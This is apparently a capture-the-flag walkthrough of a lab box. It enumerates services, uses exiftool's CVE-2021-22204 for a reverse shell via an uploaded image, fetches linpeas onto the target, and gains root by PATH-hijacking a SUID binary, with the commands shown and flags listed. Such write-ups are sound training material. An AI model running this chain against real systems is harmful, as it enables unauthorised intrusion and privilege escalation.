# Deja Vu


1. Enumerate with nmap. SSH is running on port 22, and an http server running on golang is on port 80. If we check the website's source code, we find a comment that suggests that the dog pictures are clickable. It seems that they have additional data about the pictures
```
root@ip-10-10-116-168:~# sudo nmap -sS -A 10.10.58.228

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-20 03:38 BST
Nmap scan report for ip-10-10-58-228.eu-west-1.compute.internal (10.10.58.228)
Host is up (0.0034s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 30:0f:38:8d:3b:be:67:f3:e0:ca:eb:1c:93:ad:15:86 (RSA)
|   256 46:09:66:2b:1f:d1:b9:3c:d7:e1:73:0f:2f:33:4f:74 (ECDSA)
|_  256 a8:43:0e:d2:c1:a9:d1:14:e0:95:31:a1:62:94:ed:44 (EdDSA)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Dog Gallery!
MAC Address: 02:DE:C1:6E:B6:65 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (93%), Linux 3.8 (93%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   3.39 ms ip-10-10-58-228.eu-west-1.compute.internal (10.10.58.228)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
```

2. Brute force directories with gobuster and find the `/upload` endpoint
```
root@ip-10-10-116-168:~# gobuster dir -u http://10.10.58.228/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.58.228/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/20 03:49:12 Starting gobuster
===============================================================
/favicon.ico (Status: 200)
/index.html (Status: 301)
/upload (Status: 301)
===============================================================
2022/04/20 03:49:12 Finished
===============================================================
```

3. Download a random picture, upload it, and we find that it gets displayed in the home page

4. Use Burp Suite to analyze the requests made when a dog picture is clicked. These are the requests Burp caught, in order. It seems like there are multiple endpoints with different purposes
```
GET /dogpic/?id=0 HTTP/1.1
Host: 10.10.58.228
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.58.228/
Upgrade-Insecure-Requests: 1
```
```
GET /dog/get/0 HTTP/1.1
Host: 10.10.58.228
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.58.228/dogpic/?id=0
```
```
GET /dog/getexifdata/0 HTTP/1.1
Host: 10.10.58.228
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
```
GET /dog/getmetadata/0 HTTP/1.1
Host: 10.10.58.228
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

5. We want to find the version of exiftool, so we want to capture the response to the request made to `/dog/getexifdata/0`. Use `Do Intercept` > `Response to this request` to do this. It seems that the server simply executes exiftool and sends all the data through the api to us, which is excessive data exposure. We find that the exiftool version is `12.23`
```
HTTP/1.1 200 OK
Content-Type: application/json
Date: Wed, 20 Apr 2022 05:23:08 GMT
Content-Length: 1238
Connection: close

[{
  "SourceFile": "temp/2395016649.jpg",
  "ExifToolVersion": 12.23,
  "FileName": "2395016649.jpg",
  "Directory": "temp",
  "FileSize": "339 KiB",
  "FileModifyDate": "2022:04:20 06:23:06+01:00",
  "FileAccessDate": "2022:04:20 06:23:06+01:00",
  "FileInodeChangeDate": "2022:04:20 06:23:06+01:00",
  "FilePermissions": "-rw-------",
  "FileType": "JPEG",
  "FileTypeExtension": "jpg",
  "MIMEType": "image/jpeg",
  "JFIFVersion": 1.01,
  "ExifByteOrder": "Big-endian (Motorola, MM)",
  "XResolution": 96,
  "YResolution": 96,
  "ResolutionUnit": "inches",
  "Artist": "Muirland",
  "DateTimeOriginal": "2021:09:10 21:35:47",
  "CreateDate": "2021:09:10 21:35:47",
  "SubSecTimeOriginal": 14,
  "SubSecTimeDigitized": 14,
  "XPAuthor": "Muirland",
  "Padding": "(Binary data 2060 bytes, use -b option to extract)",
  "About": "uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b",
  "Creator": "Muirland",
  "ImageWidth": 1022,
  "ImageHeight": 845,
  "EncodingProcess": "Baseline DCT, Huffman coding",
  "BitsPerSample": 8,
  "ColorComponents": 3,
  "YCbCrSubSampling": "YCbCr4:4:4 (1 1)",
  "ImageSize": "1022x845",
  "Megapixels": 0.864,
  "SubSecCreateDate": "2021:09:10 21:35:47.14",
  "SubSecDateTimeOriginal": "2021:09:10 21:35:47.14"
}]
```

6. After doing some research, it's apparent that exiftool version 12.23 has a vulnerability `CVE-2021-22204` that allows for remote code execution. There are many exploits available such as [this one](https://github.com/AssassinUKG/CVE-2021-22204), but we can use the build in module in metasploit. A few sources that explains the vulnerability [1](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/), [2](https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool), [3](https://www.openwall.com/lists/oss-security/2021/05/10/5)

7. After generating the payload image, upload it using the `/upload` endpoint, launch a reverse shell listener, and then click on the image on the home page to trigger it and get a shell. Now print out the contents of the file `/home/dogpics/user.txt` to get `dejavu{735c0553063625f41879e57d5b4f3352}`

8. Now download linpeas on the attacker machine, host it on an http server with `python3 -m http.server`, and download it onto the victim and run it. We find that `/home/dogpics/serverManager` has the suid bit set and can be run with root permissions
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("sudo systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```

9. We see that the full path of `systemctl` isn't specified, so we can create our own systemctl binary and modify the path to point to it. Then we can run it through `serverManager` and escalate privileges
```
[dogpics@dejavu ~]$ which systemctl
/usr/bin/systemctl
[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl
[dogpics@dejavu ~]$ chmod +x systemctl
[dogpics@dejavu ~]$ export PATH=.:$PATH
[dogpics@dejavu ~]$ which systemctl
./systemctl
[dogpics@dejavu ~]$ ./serverManager
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
[root@dejavu ~]# whoami
root
```

10. Print out `/root/root.txt` to get `dejavu{5ad931368bdc46f856febe4834ace627}`
